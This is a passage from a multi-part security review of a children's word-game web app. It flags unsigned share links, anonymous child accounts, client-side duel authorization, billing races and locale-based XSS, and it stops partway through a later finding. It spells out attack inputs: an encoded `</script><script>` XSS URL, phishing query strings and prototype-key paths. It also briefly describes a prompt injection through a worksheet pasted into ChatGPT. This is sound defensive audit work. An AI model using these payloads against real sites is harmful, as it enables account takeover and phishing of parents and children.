**Severity:** Medium (cost and availability at the next 10x)

**Where:**
- `daily-word-wheel/page.tsx:7`
- `editorial-policy/page.tsx:4`
- `daily/archive/page.tsx:9`
- `daily/archive/[date]/page.tsx:9, 32-34`

**Problems:**
- The word-wheel landing (your indexable page for that mode) and the editorial page are pure constants plus translations. Every request still does a full SSR, and the landing loads translations twice (metadata and page).
- The archive grows by 6 URLs a day: one date across 6 locales, about 780 already. Each one is `follow: true` and linked from the index.
- Each archive hit makes a server-side `fetch` for stats. In Next 14, `dynamic = 'force-dynamic'` forces `no-store` on every fetch, which overrides `next: { revalidate: 3600 }`. Check this against your Next version.
- Past-day stats never change, yet every crawler pass re-queries the backend for each URL.

**Fix:**
- Remove `force-dynamic` from these four files.
- Use `revalidate = 86400` for the landing and editorial pages.
- For archive dates, use a long `revalidate`, since the data is immutable.
- Make the archive index ISR with `revalidate = 3600`.

## 5. Archive stats fail silently, possibly against localhost in production
**`daily/archive/[date]/page.tsx:31, 35, 43-45, 214-217`** · **Low-Medium** (failure handling)

**Problems:**
- If neither `NEXT_PUBLIC_API_URL` nor `API_URL` is set in the deploy, the base URL falls back to `http://localhost:3001`.
- A non-OK response, or any thrown error, returns `null` with no log.
- Users then see "Stats not available for this puzzle **yet**" on every past puzzle, permanently, and nothing alerts you.
- Using a `NEXT_PUBLIC_` (public) URL for a server-to-server call also routes through your public edge or rate limiter. Under crawl load, all SSR requests come from one IP, so your own backend can throttle them. The page then degrades to "not available" without any error.

**Fix:**
- Use a server-only `API_URL` and fail at boot if it is missing in production.
- Log non-OK responses and errors with status codes.
- Change the copy to drop "yet" when the date is in the past.

## 6. Invalid archive dates return a 200 soft-404 across an unbounded URL space
**`daily/archive/[date]/page.tsx:54-56, 126-139`** · **Low**

**Failure scenario:**
1. Any path segment, such as `/en/daily/archive/<anything>`, renders "Puzzle Not Found" with HTTP 200.
2. Combined with `force-dynamic`, each junk URL triggers a full SSR.
3. `generateMetadata` loads two translation bundles (`:51-52`, both unused) before it checks the date.
4. Search engines log these as soft 404s on a domain you're trying to get through AdSense quality review.

**Fix:**
- Call `notFound()` when `!isValidArchiveDate(date)` in both functions.
- Move the validation check above the translation loads, and delete the unused `t` and `enT`.

---

## Checked in this slice and not reported
- **Dev harnesses:** `dev/layout.tsx` gates them with `notFound()` in production. The client chunks still build, but none of them carries secrets.
- **Account-related rendering:** `access/PageClient.tsx` renders `admin_note` through React, so it is escaped.
- **Teacher redirect:** the redirect in `education/PageClient.tsx` is UX only, with no authz meaning.
- **Archive request:** in `archive/[date]`, the date is regex-validated before it reaches the backend URL, and the language comes from `validLocale`.
- **Archive scope:** the archive excludes today's puzzle, so it can't spoil the live answer.

## Shard 40

# Senior review: share routes, duels and kids copy (findings the previous pass missed)

**Scope.** I could see only the pages listed in this shard. I could not see `ChatGptReteachAutostart`, `ClassicUnpluggedLive`, `ClassGapReteachLiveCta`, `parseClassGapShareParams`, `getDuelLessons`, `getStudentClassroom`, `readStudentName`, the duel submit path or any RLS policies.

Where a finding depends on one of those, the line **Depends on** says what to check. I left out everything the previous pass already reported: the duel `getProfile(null)` call, the effect races, the brain-breaks copy, and the general "confirm locale is whitelisted" notes.

---

## 1. Anyone with a link can choose the words projected to a class of children (High)

**Where:**
- `education/chatgpt-reteach/page.tsx:36-42` and `:109-114`
- `education/classic-unplugged/page.tsx:24-29` and `:39-42`
- `education/class-gap/page.tsx:39-44` and `:180-188`

**Scenario:**
1. All three routes build the payload (`lesson`, `missed`, `found`, `total`, `lang`) directly from the query string. They pass it to a component whose job is to start a live projector session. One of them is literally named `ChatGptReteachAutostart`.
2. An attacker crafts `/en/education/chatgpt-reteach?lesson=Unit+3&missed=<slurs or a phishing URL>` and gets it to a teacher. Ways to deliver it:
   - Forward it in a staff chat.
   - Reply to a parent thread that already contains a real class-gap link.
   - Use prompt injection: hide instructions in a worksheet the teacher pastes into ChatGPT, so the ChatGPT Action emits the link itself. The LLM's output is an untrusted input here.
3. The teacher opens the link on the classroom PC. If the component autostarts, a GET request has a side effect, and the attacker's words go on the projector in front of 6–12 year olds.
4. If the component does not autostart, the teacher still sees a ready-made "Start reteach Live" for words they never chose.

**Why it matters:** This is a reputational, trust-ending incident for a kids and education product, and it happens at the exact moment you are trying to sell to schools.

**Depends on:** whether the Autostart and Live components emit `createClassroomGame` without a click, and whether they cap or validate the words.

**Fix:**
- **Sign the share links.** When you mint a class-gap or reteach link from real results, sign the payload with an HMAC (`sig=` over lesson, words, totals and expiry). Unsigned or expired links should render read-only with no Live CTA.
- **For the ChatGPT Action**, mint the signed link server-side in the Action handler, after the teacher has authenticated.
- **Never autostart.** Require an explicit tap from an authenticated teacher. Treat this as CSRF hygiene: no side effects on GET.
- **Validate on the server:** at most about 20 words, at most about 30 characters each, and each word must exist in that language's dictionary. That last check also removes slurs and URLs.

## 2. Class-gap share cards can impersonate a teacher in parent chats, and every unfurl is an uncached render (Medium)

**Where:** `education/class-gap/page.tsx:46-99` (metadata), `:69-76` (OG image) and `:151-153` (`payload.teacher` rendered under the lesson title)

**Scenario:**
1. The `teacher`, `lesson` and `missed` parameters are free text. They flow into the `<title>`, the OG description, the OG image URL and the page's `<h1>`.
2. An attacker crafts `?teacher=Ms.+Levi&lesson=Your+child's+account+will+be+deleted+—+verify+at+lexiclash-support.xyz` and posts it in a class WhatsApp group.
3. WhatsApp unfurls it as a LexiClash card from `www.lexiclash.live`, carrying the teacher's name. That is a phishing vector aimed at parents.
4. At 10x scale, `force-dynamic` (`:21`) applies with no length caps. Every unique query string triggers a full SSR, two `loadTranslation` calls (one from `generateMetadata` and one from the page) and a fresh OG image render. A crawler or script cycling parameters becomes a cheap CPU and cost DoS.

**Fix:**
- The signed payload from #1 solves most of this: render unsigned links as a generic card with no teacher name.
- Clamp each field before both metadata and OG generation. Cap the teacher name at 40 characters and strip anything URL-like.
- Cache the OG image route keyed on the signature.

## 3. The kids pages say "kids never create accounts", but every joined kid gets a persistent anonymous auth account (Medium-High, compliance)

**Where:**
- The claim: `education/boggle-for-kids/content.ts:96`, `:143`, `:46`, and the same text in all six locales (`:249`, `:402`, `:555`, `:707`, `:859`)
- The reality: `education/duels/PageClient.tsx:252-254` ("anonymous guests after classroom join") and `:78-80`. A prior shard showed that `/classroom/join` runs `signInAnonymously()` and upserts a profile with a display name.

**Scenario:**
1. A parent reads "kids never create an account" and lets a 7-year-old join.
2. The backend creates an `auth.users` row and a `profiles` row with the child's chosen name. Game, duel and XP rows then attach to that id.
3. This page targets families ("Family & Classroom"). The school-consent route COPPA allows for classroom use does not cover parent-hosted play, so you are collecting identifiers from under-13s on a page that says you don't.
4. At 10x scale, these accounts are never cleaned up:
   - Every wrong code, new device or cleared cookie creates a new orphaned user.
   - A lost anonymous session also orphans that child's duels and history permanently.
   - `auth.users` and `profiles` grow without bound.

**Why it matters for revenue:** A district privacy review will compare this copy to your database and find the mismatch.

**Fix:**
- Change the copy to say what actually happens, for example "no email or password; we store a temporary nickname for the session".
- Add a retention job that purges anonymous users inactive for N days, along with their profiles and rows.
- Don't persist a display name beyond the game for non-classroom (family) rooms.
- Write a short children's privacy notice before you sell to schools.

## 4. Duel authorization is enforced in the browser; check that the server enforces it too (Medium)

**Where:** `education/duels/[duelId]/PageClient.tsx:82-96` (participant check) and `:211`, `:220` (`studentId={user!.id}` passed down as a prop)

**Scenario:**
1. "Is this user a participant?" is evaluated in the client, after `getDuelById` has already returned the full duel row.
2. A student opens DevTools and calls the score-submit path (Supabase insert or update, or a socket emit) for a duel they are not in, or for their own duel with an arbitrary score. Async duel scores are computed on the client.
3. If the server only checks "authenticated", which an anonymous guest also passes, they can:
   - write results into other students' duels;
   - win every duel;
   - farm any XP or coins that duels award.

   A prior shard found the same pattern in classroom games: an unbounded `score` that turns into XP.

**Depends on:** the RLS on `duels` select and update, and the duel submit handler.

**Fix:**
- Derive the user from the session on the server. Never trust a `studentId` from the client.
- Assert the user is a participant inside the write: RLS `USING (auth.uid() in (challenger_id, opponent_id))`, or an RPC.
- Allow one submission per participant, enforced with a unique constraint.
- Clamp the score to the lesson's maximum possible score.

## 5. `getDuelLessons()` "filters by nothing and lets RLS decide" (Medium)

**Where:** `education/duels/PageClient.tsx:89-101`

**Scenario:**
1. The lesson list for the challenge dialog is whatever lesson rows RLS lets this user read. It is not scoped to `classroom.id`.
2. **Integrity:** a student in two classes is offered lessons from class B while challenging a classmate in class A. The duel is then created with a lesson the opponent's teacher never assigned.
3. **Exposure:** if lesson RLS grants read access to the `authenticated` role, it is open to anyone. Anonymous users can be minted on demand (see #3), so any visitor could enumerate every teacher's custom word lists. That is your paying users' content.
4. **10x scale:** the query has no limit. Once more than 1000 lessons are visible, PostgREST silently truncates the result, and the picker shows an arbitrary subset with no error.

**Fix:** Replace it with `get_duel_lessons(p_classroom_id)`, an RPC or view that:
- checks the caller is a member of that classroom;
- returns only lessons assigned to that classroom;
- orders the results and applies a limit.

Audit lesson RLS for `auth.role() = 'authenticated'`-style policies.

## 6. The duel lobby assumes a student is in exactly one classroom, which conflicts with the "unlimited classes" Pro plan (Medium)

**Where:** `education/duels/PageClient.tsx:85-87` and `:145-147`

**Scenario:**
1. `getStudentClassroom(user.id)` returns a single classroom.
2. A Pro teacher creates a second class, or a student joins both a homeroom and an ESL class. The student now has two membership rows.
3. If the helper uses `.single()` or `.maybeSingle()`, it errors on two rows. The `catch` at `:103-105` swallows the error, and an enrolled student sees "Join a classroom to duel".
4. If it uses `.limit(1)` with no ordering, the student lands in an arbitrary class each time and challenges the wrong classmates.

This breaks precisely for the customers who paid for multiple classes.

**Depends on:** the implementation of `getStudentClassroom`.

**Fix:** Return every classroom membership. Add a classroom switcher, or take `classroomId` from the URL, and scope the classmates, lessons and `DuelNotification` to it.

## 7. Classmate names are resolved from a client-side cache because profile RLS is own-row only (Low-Medium, privacy and architecture)

**Where:** `education/duels/[duelId]/PageClient.tsx:104-114` (`readStudentName`), and the "banks every name it sees" behaviour described in the lobby

**Scenario:**
1. The server cannot give students their classmates' names. The comment says own-row RLS returns `null`. So the lobby stores a user-id-to-name map, presumably in `localStorage`.
2. On a shared school Chromebook, student A signs out and student B signs in. B's browser still holds A's cached names of minors, possibly from another classroom.
3. If a name was never seen in the lobby, it shows as "Opponent". Names are inconsistent from device to device.

**Fix:**
- Add a classroom-scoped `classroom_member_names(classroom_id)` RPC that checks the caller is a member and returns display names only.
- Delete the client cache. If you keep it, scope it per user id and clear it on sign-out.

## 8. JSON-LD is stringified into `<script>` with no escaping, and share routes let `?lang=` override the route locale (Low-Medium, systemic)

**Where:**
- `education/duels/page.tsx:15-24` (`JSON.stringify(howTo|resource|breadcrumb)` into `dangerouslySetInnerHTML`, built from the path `locale`)
- `class-gap/page.tsx:42`, `chatgpt-reteach/page.tsx:39` and `classic-unplugged/page.tsx:27`, where the route locale is used only if `lang` is absent

**Scenario:**
1. `JSON.stringify` does not escape `</script>`. If any locale-derived or URL-derived string reaches these builders, a payload containing `</script><script>…` executes on your origin. That happens if middleware lets an unknown segment through, or if a future builder interpolates a query parameter.
2. Separately, `/he/education/class-gap?lang=xx` makes `payload.locale` attacker-chosen. That value then feeds `loadTranslation(payload.locale)`, the canonical URL and `dir`.

**Depends on:** whether `parseClassGapShareParams` whitelists `lang`.

**Fix:**
- Add one `safeJsonLd(obj)` helper, `JSON.stringify(obj).replace(/</g, '\\u003c')`, and use it for every JSON-LD script in the repo. That closes the "confirm locale is whitelisted" caveats from the previous pass in one place.
- In the share routes, whitelist `lang` against `LOCALES`, and fall back to the route locale rather than letting the query override it.

---

## Order of work

- **Before any school or parent push:** #1 and #2 (one signed-link change fixes both), then #3.
- **Before you count on duels for engagement:** #4 and #5 (server-side scoping).
- **Before Pro "unlimited classes" is real:** #6.

## Shard 41

# Senior review: early-finishers, english-games-adults and english-games-elementary

## Scope

The files in this batch are static locale copy, thin `page.tsx` wrappers and JSON-LD builders. None of them contain auth, billing, queries or socket handlers, so most review categories have nothing to hit here.

The prior pass already reported the swapped primary/secondary CTA in `english-games-adults/landing.ts:20-24`. I don't repeat it.

What this batch adds:
- **Findings 1 and 2:** the copy instructs teachers to use the product in a way that runs into the backend design the prior pass described.
- **Finding 3:** one caching and trust-boundary issue in the page wrappers.
- **Finding 4:** the Pro features sold as free here.

Where a finding relies on code I can't see, I say which prior-pass finding it rests on.

---

## 1. Shared-device play merges several children into one identity (High, inferred)

**Where:**
- `early-finishers-activities/content.ts:88`: "go to the device … and join with the class code".
- `content.ts:142`: "at least one device … for early finishers to share".
- `content.ts:150`: the dashboard shows "which words they found, and which they missed".
- The same instructions appear in all 6 locales (for example he `:253`, `:307`).
- Backend: `app/api/education/classroom/join/route.ts:58-96`, which per prior shard 4 #7 calls `signInAnonymously()` only for logged-out callers.

**Failure scenario:**
1. The teacher follows this page and puts one shared Chromebook or tablet at the back of the room.
2. Child A finishes first and joins with the code. The join route mints an anonymous Supabase user, and its session is stored in that browser.
3. Child B sits down at the same device. The browser is now *logged in* as A's anonymous user, so the route skips guest creation and B plays as A.
4. B's scores, found words and missed words are written to A's record. The XP and roster check also run against A's id.
5. The teacher's dashboard, which this page sells as the reason to adopt (`:114`, `:150`), shows one super-student and several children with no activity.

This is silent data corruption in the exact feature that justifies a Pro upgrade. It is also a privacy problem for minors, because B can see A's history.

**Fix:**
- On the join screen, when an anonymous session already exists, ask "Are you {name}? / Not me". "Not me" should sign out and mint a fresh guest.
- Better: always mint a new anonymous session when joining through a class code from a device flagged as shared.
- Separately, add the code validation and rate limit before guest creation, as shard 4 #7 already recommends.

## 2. The copy promises a self-running, always-on station that the live-room design can't provide (Medium)

**Where:** `early-finishers-activities/content.ts:32` ("zero setup per day"), `:40` ("runs itself"), `:78` ("One code works all term"), `:88`, `:146` ("Same code all term"). The same claims appear in all locales.

**Failure scenario:**
1. The prior pass describes live classroom games as Redis records created per game with a TTL (`classroomGameManager.ts:63-67`, shard 5 #2) and started by a teacher host (`startClassroomGame`).
2. This page's flow has no host. Early finishers join on their own while the teacher is still teaching, using a code written on the board weeks earlier.
3. Either the "class code" is the classroom membership code, in which case joining starts no game. Or it is a game code, which expires and needs a teacher to start it.
4. Either way, a student who follows the routine card on day 3 sees no game, or an expired or ended code.
5. This is the page's only use case, so the teacher churns during the trial.

**Fix:**
- Decide whether a classroom-scoped solo mode exists. That means the class code leads to a solo round, and its results are attributed to the classroom.
- If it exists, point the CTA (`:43`) at it.
- If it doesn't, rewrite steps 1–3 and the FAQ at `:146` to describe the real flow.

This is the highest-intent landing page for a "set and forget" buyer, so a feature mismatch here costs revenue directly.

## 3. An unvalidated `locale` combined with ISR gives unbounded cache entries and attacker-chosen canonicals and JSON-LD (Medium, conditional on middleware)

**Where:**
- `early-finishers-activities/page.tsx:9` (`revalidate = 86400`), `:15-22`.
- `english-games-adults/page.tsx:8`, `:14-21`.
- `english-games-elementary/page.tsx:8`, `:14-21`.
- `english-games-adults/jsonLd.ts:13` and `english-games-elementary/jsonLd.ts:13` (`url: \`${BASE_URL}/${locale}${PAGE_PATH}\``).
- `early-finishers-activities/content.ts:1013-1015` (`MAP[locale] ?? EN` with no normalization).

**Failure scenario:**
1. None of these pages has `generateStaticParams` or `dynamicParams = false`. None of them checks `locale` against an allowlist.
2. A crawler or attacker requests `/zz1/education/english-games-adults`, `/zz2/…` and so on.
3. Each one renders English content and is stored as a separate ISR entry for 24 hours. Disk or cache usage grows without limit, which is the 10x problem as crawl volume rises. The canonical, the hreflang tags and the `Course.url` all contain the attacker's string.
4. Next decodes dynamic params. If `educationCourseJsonLd` is emitted through `JSON.stringify` in `dangerouslySetInnerHTML` (shard 26 found this pattern elsewhere), a decoded `</script>` in the segment breaks out of the script tag. That output is then cached for every visitor to that URL, which makes it a stored XSS.
5. Separately, `he-IL` would get English on early-finishers, although the adults and elementary pages normalize through `pickLocaleContent`.

**Fix:**
- In each `page.tsx`, add `export const dynamicParams = false` and a `generateStaticParams` that returns the 6 locales.
- Alternatively, call `notFound()` when `!LOCALES.includes(locale)`, in both the page and `generateMetadata`.
- Escape `<` as `\u003c` in the shared JSON-LD serializer, so every page is covered at once.
- If middleware already rejects unknown locales, the first two problems are moot. The escaping change is still worth making.

## 4. Pro-gated features are sold as free on early-finishers (Low–Medium, revenue)

**Where:** `early-finishers-activities/content.ts:114` and `:150`, plus their copies in all locales.

**Failure scenario:**
1. The page promises a per-student missed-words dashboard. It never mentions Teacher Pro.
2. The prior pass found analytics behind `<ProGate feature="analytics">` (shard 2 #2).
3. A free teacher builds the routine around the dashboard and then hits a paywall. That reads as bait-and-switch rather than as an upgrade moment.

**Fix:** Label it "Teacher Pro: per-student missed-words report". This turns the claim into an upsell instead of a refund risk.

---

## Worth a 2-minute check
- **Possible broken link:** `early-finishers-activities/content.ts:165` links `/education/middle-school-word-games` in all 6 locales. The page reviewed in shard 39 lives at `/education/english-games-middle-school`. If the first route doesn't exist, every early-finishers page has a dead related link.

## What the prior pass missed at the system level
The prior pass reported these issues one shard at a time, without ranking them against each other. Fixing them as patterns is cheaper than fixing each instance.

1. **The server trusts client-supplied identity and values.** Instances:
   - the socket `handshake.auth.authUserId` fallback (shard 5 #1)
   - uncapped classroom scores becoming XP (shard 5 #3)
   - the blast client-claimed level (shard 3)
   - brag and daily OG params (shards 35 and 36)

   Shard 5 #1 combined with #3 lets a student impersonate the teacher and mint unlimited XP. That is the only ship-blocker in the whole report, and it should be fixed before any paid class runs.
2. **Read-modify-write counters, at roughly 8 sites.** These are ratify points, blast stats, profile stats, challenge progress, `words_attempted`, chest parts and the curator payout. Replace them with one or two Postgres RPCs that do atomic increments or appends, instead of 8 separate patches.
3. **Emails sent without a per-recipient idempotency ledger.** This affects the trial-expiry, day-10, trial-reminder and weekly-digest crons. One `email_sends(user_id, campaign, period)` table with a unique key, written before sending, fixes all four. These are the conversion emails for first revenue.

## Shard 42

# Security and architecture review: what the previous pass missed

The files in this batch are static landing copy: the middle-school, vocabulary-topics and ESL pages. On their own they contain no security logic. The previous pass already covered their copy and CTA defects (shards 39 and 40).

The gaps it missed sit in the seams between modules it reviewed separately. A promise in this copy is broken by a backend route. Two billing paths write the same row. One abuse vector combines with one cap. Where a finding depends on code I haven't seen in this batch, I cite the line the previous report cited and say so. Ordered by severity.

---

## 1. Children get persistent accounts with no way to delete them, while the copy says "no account" (High: compliance and school procurement)

**Where:**
- **Promise (seen):**
  - `english-games-middle-school/copy.en.ts:63` says "No email, no account".
  - `:103` says "Do teens need an account? No."
  - `english-vocabulary-topics/copy.en.ts:63`, `:81` and `:103` say the same.
  - The he, sv, ja and ru copy repeats it.
- **Backend (from prior report, not seen):**
  - `app/api/education/classroom/join/route.ts:58-96` calls `signInAnonymously()` and upserts a profile for every logged-out joiner.
  - `account/delete/PageClient.tsx:22` starts self-deletion at an email step.
  - `api/education/miss-gap/progress/route.ts:70,118` returns named rosters to any anonymous user.

**Failure scenario:**
1. A teacher picks LexiClash because the page says students need no account. Shard 1 also found a "FERPA-compliant" claim.
2. Each of 30 students joins by code. Each one gets a permanent Supabase auth user and a `profiles` row with a display name and classroom link.
3. A parent or district asks for the child's data to be erased. The child has no email, so `/account/delete` can't be completed. I found no TTL or cleanup for anonymous users in anything reviewed.
4. Meanwhile any anonymous session holding a class link can read the named roster (shard 4 #8).
5. The marketing claim, the data actually held, and the erasure ability all disagree. A district DPA review catches this, and it blocks school revenue.

**Fix:**
- Add a scheduled job using the service role. It should delete anonymous auth users and their profiles after N days of inactivity, or when the teacher archives or removes the student.
- Add a teacher-side "remove student" action that deletes the underlying anonymous user, not just the membership.
- Change the copy to "no sign-up — students get a temporary guest session that's deleted after N days". Drop "FERPA-compliant" until a DPA exists.

---

## 2. Admin Pro grants and Polar webhooks can overwrite each other's entitlement (High, inferred)

**Where (from prior report):**
- `webhook/polar/route.ts:281-291`: revoke writes `tier:'free', status:'canceled'` keyed only by `userId`.
- `lib/education/proGrantServer.ts:155-182`: the grant path upserts a subscription for the same user.
- `webhook/polar/route.ts:36-37`: unknown status maps to `active`.

**Failure scenario:**
1. A teacher starts a Polar trial and lets it lapse.
2. You comp them, or their school, with an admin Pro grant. `applyGrantToUser` upserts their subscription to Pro.
3. Polar delivers a delayed or retried `subscription.revoked` or `canceled` for the old trial.
4. The handler writes `free/canceled` for that `userId` without checking provider or `provider_subscription_id`. The comped teacher, possibly a whole school deal, loses Pro mid-term.
5. The reverse also happens. A grant upsert onto a row holding a live Polar subscription can clobber `provider_subscription_id`. Later Polar events for the real paid subscription then fail the "is this my subscription" check, or are mis-applied.

The previous pass flagged revoke versus re-subscribe ordering. It did not flag the collision between the grant path and the webhook path.

**Fix:**
- Store entitlements per source, as `(user_id, provider)` rows: `polar` and `grant`. Compute Pro as "any active source", which is what `resolveProEntitlement` should own.
- In webhook writes, match on `provider='polar' AND provider_subscription_id = data.id`.
- Reject events older than the stored `updated_at`.
- Default unknown statuses to non-entitled.

---

## 3. One student can fill a free class to its 50-seat cap from the projector code (Medium-High: classroom denial of service)

**Where (from prior report):**
- `classroom/join/route.ts:58-96`: no rate limit, and an anonymous user is minted before the code is validated.
- `:100-124` and `:220-239`: `canAddStudent` check-then-insert against the free cap.
- **This batch:** "free for 3 classes of 50" in every `copy.*.ts` (for example `english-games-middle-school/copy.en.ts:45`).

**Failure scenario:**
1. The join code is shown on the projector by design (`copy.en.ts:62`).
2. A student scripts about 50 POSTs to `/classroom/join`. Each mints a new anonymous user, so per-user dedupe doesn't apply.
3. The free class reaches 50 members. The check-then-insert race may let it go past 50.
4. Real students now get "class full" mid-lesson. The teacher's only way out is the upsell, or recreating the class. Either way the first impression is "it broke during my lesson."

**Fix:**
- Rate-limit joins per IP and per classroom, for example with `checkApiRateLimit` like the sibling routes.
- Enforce the cap in SQL, in an RPC or with a constraint, inside the insert.
- Don't count anonymous members with no activity against the cap.
- Let the teacher lock the roster or rotate the code from the host screen.

---

## 4. An unvalidated `[locale]` combined with ISR means unbounded cached pages, with a script-context concern to check (Medium)

**Where (seen):**
- `english-games-middle-school/page.tsx:8,14-22` and `english-vocabulary-topics/page.tsx:8,14-22`: `revalidate = 86400`, with no `generateStaticParams` or `dynamicParams=false`, and the raw `locale` passed through.
- `english-games-middle-school/jsonLd.ts:13` and `english-vocabulary-topics/jsonLd.ts:13`: `url: \`${BASE_URL}/${locale}${PAGE_PATH}\`` is built from the raw segment.
- `content.ts:8` in both: `pickLocaleContent` falls back to English, so any segment returns 200.

**Failure scenario:**
1. A bot requests `/<random>/education/english-games-middle-school` for thousands of random prefixes. The same works across all ~40 education landings that share this pattern.
2. Each path renders English content with a self-referencing canonical and JSON-LD, then gets written to the ISR cache for 24 hours. Self-hosted, that fills `.next/cache`. On Vercel, each write costs money.
3. Search engines can index the duplicates. Shard 41 found this for two other pages but not as a cache-growth problem.
4. Script-context escape: if the router decodes `%2F` in params and the JSON-LD serializer doesn't escape `<`, a segment containing `</script>` breaks out of the script tag. That would be XSS on the origin that holds the Supabase session. Most likely it isn't exploitable, but verify both conditions.

**Fix:**
- In `[locale]/layout.tsx`, export `generateStaticParams` over `LOCALES` and set `dynamicParams = false`. Alternatively, have middleware 404 any non-whitelisted first segment.
- Serialize all JSON-LD through a helper that escapes `<`, as `\u003c`.

---

## 5. Subscription state is interpreted in four places with four different meanings (Medium: breaks as subscriber count grows)

**Where (from prior report):**
- `webhook/polar/route.ts:36-37`: unknown statuses map to `active`.
- `lib/education/polarTrial.ts:131`: `trialing` is counted as a lapse.
- `lib/education/polarTrialExpiryJourney.ts:30,56,69`: `canceled` is eligible for "trial expired" emails even after the user paid.
- `cron/teacher-pro-churn-watch/route.ts:56-59`: a row missing from a capped page is treated as churn.

**Why it's a design issue, not four bugs:** each consumer re-derives "trialing, paying, lapsed or churned" from raw `status` plus timestamps. The previous pass fixed each one in isolation. With one or two subscribers the drift isn't visible. With 50 or more, every new email journey or banner adds another interpretation, and trial teachers get "your trial ended" and "you churned" while still in trial. That damages the one conversion moment you have.

**Fix:** add one pure function, `lifecycleState(subRow, events) → 'trialing'|'trial_lapsed'|'paying'|'canceled_paid'|'grant'|'free'`. Unit-test it against Polar's status list, and have every cron, banner and gate call it. This also removes the `mapStatus` fail-open path.

---

## 6. Each lifecycle email cron has its own idempotency scheme, and all of them break past about 1,000 users (Medium: 10x)

**Where (from prior report):**
- `cron/teacher-polar-trial-expiry/route.ts:104-108` and `teacher-polar-trial-day10/route.ts:82-86,168-176`: an unpaginated `.in()` read of `subscription_events`.
- `cron/teacher-trial-reminders/route.ts:76,117-124`: buckets are appended to a row, only on the surviving duplicate.
- `cron/teacher-weekly-digest/route.ts:55,116,242-253`: no per-week marker at all.

**Failure scenario at 10x:**
1. `subscription_events` passes the PostgREST 1,000-row default.
2. Ledger reads silently truncate, so "already sent" markers disappear.
3. All crons re-email users daily or weekly.
4. Each fix the previous pass suggested, such as paginating, upserting or deduping, has to be repeated per cron. The next journey you add starts out with the bug.

**Fix:** create one table, `email_sends(user_id, campaign, period_key) UNIQUE`. Before sending, every cron does `INSERT ... ON CONFLICT DO NOTHING RETURNING` and sends only when a row comes back. Claiming before sending turns a failed send into a skipped send, which is the safe direction for billing nags. This removes the `.in()` lists and the pagination dependency entirely.

---

## 7. The middle-school "Open a Duel" CTA sends a logged-out teacher into the student-only duel lobby (Medium: funnel, inferred)

**Where:**
- **Seen:** `english-games-middle-school/landing.ts:22` sets `secondary: '/education/duels'`. `copy.en.ts:19` labels it "⚔ Open a Duel", and the FAQ at `:119` tells teachers to "open a duel".
- **From prior report:** `education/duels/PageClient.tsx:77-111` loads the user's `classroom`, `classmates` and `lessons`, which is a student's view of their own class.

**Failure scenario:**
1. A teacher arrives from search and clicks the secondary hero CTA.
2. They land on a page that expects a signed-in student with a classroom. They see an empty or broken lobby, with no path to creating a classroom.
3. The previous pass noted that the label didn't match the link in four locales. It missed that in English and Spanish the label is correct but the destination is wrong for the person reading it.

**Fix:** point the CTA at the classroom-game setup with a duel preset, for example `/education/classroom-game?mode=duel`. Alternatively, make `/education/duels` redirect non-students to teacher setup.

---

## What I checked in this batch and found fine
- `getMiddleSchoolEnglishClassGames`, `getVocabTopicsClassGames` and `getEslClassGames` normalize regional locales and fall back safely.
- The `jsonLd.ts` builders take only static name and description strings plus `locale`. `locale` is the only untrusted input, which is covered in #4.
- The dictionary counts come from `dictionaryFloor`, not literals. Pricing and limit literals remain a drift risk, and the previous pass already reported that.

**Priority for first revenue:** fix #2 before you comp any school. Fix #1 and #3 before pitching any district. #4 and #6 are cheap, structural fixes that prevent whole classes of repeat bugs.

## Shard 43

# Security and architecture review: ESL, icebreakers and for-schools pages

## Scope and what's new here

The eight files in this request are static landing pages. They contain no authorization logic, no writes and no concurrency. The previous pass already covered their content contradictions:

- the student-account conflict and CTA swap on the ESL page
- the 30-student cap
- the for-schools locale offer drift
- unshipped icebreaker features
- self-canonical URLs for unknown locales

What it missed is mostly the **locale trust boundary**. The `[locale]` URL segment is attacker-controlled and flows unvalidated into JSON-LD, object lookups and the ISR cache. It also missed several **promises to K-12 buyers that other parts of the codebase contradict**.

There are 8 findings, ordered by severity.

---

## 1. Possible reflected XSS: the URL locale is written into three JSON-LD `<script>` blocks
**Where:** `fe-next/app/[locale]/education/for-schools/page.tsx:62,65,70,85-89,93-95`
**Severity:** High if confirmed. It depends on two pieces of code I can't see.

**Evidence that unknown locales reach this page.** The page itself handles them. `:31` computes `isTargetLocale`, and `:57` emits `noindex` for anything outside the list. Nobody writes that branch unless arbitrary segments render.

**Failure scenario:**
1. The attacker sends a teacher a link such as `https://www.lexiclash.live/%3C%2Fscript%3E%3Cscript%3E…%3C%2Fscript%3E/education/for-schools`.
2. Next decodes the dynamic param, so `locale` becomes `</script><script>…</script>`.
3. `educationFaqJsonLd({ locale })` (`:65`), `educationProviderNode(locale)` (`:70`) and `educationBreadcrumbJsonLd({ locale })` (`:85`) each build URLs containing that string.
4. `<JsonLd>` renders those URLs inside `<script type="application/ld+json">`. `JSON.stringify` does not escape `<`, so the payload closes the tag and runs on your origin.
5. The script can then read the Supabase session from `localStorage`. That is account takeover for a teacher, including a paying one.

**Conditions:** This only works if middleware or `[locale]/layout.tsx` don't reject the segment and `JsonLd` doesn't escape `<`. Shards 26 and 27 noted this pattern in passing but didn't rank it. This page is the cleanest instance, because it is the lead-capture page you send to schools.

**Check:** run `curl -s 'https://www.lexiclash.live/%3C%2Fscript%3Ex/education/for-schools' | grep -c '</script>x'`.

**Fix:**
- Validate once in `app/[locale]/layout.tsx` with `if (!LOCALES.includes(locale)) notFound()`.
- Escape inside `JsonLd`: `JSON.stringify(data).replace(/</g, '\\u003c')`.
- Do both. The escape protects every other page that interpolates locale.

## 2. Prototype-key locales crash the icebreakers page with a 500
**Where:** `fe-next/app/[locale]/education/first-day-of-school-icebreakers/content.ts:1148-1151`, reached from `page.tsx:17,22`
**Severity:** Medium. The crash is provable from this file alone.

**Failure scenario:**
1. A crawler or attacker requests `/constructor/education/first-day-of-school-icebreakers`. `/__proto__/…` and `/toString/…` behave the same way.
2. `MAP` is a plain object literal. `MAP['constructor']` returns `Object`, which is truthy, so `?? EN` never falls back.
3. `buildEducationLandingMetadata` reads `content.meta.title`, which is `undefined.title`. That throws a TypeError and the page returns 500.

The sibling pages avoid this by accident: ESL uses `===` comparisons and for-schools uses a `switch`. The `hebrew-classroom` `contentMap[locale] ?? en` from shard 1 has the same hole.

**Fix:** use `Object.hasOwn(MAP, locale) ? MAP[locale] : EN`, or a `Map`. The layout-level `notFound()` from finding 1 also closes this.

## 3. Any path segment creates a new ISR cache entry (cost and availability at 10x)
**Where:**
- `for-schools/page.tsx:19` (`revalidate = 3600`)
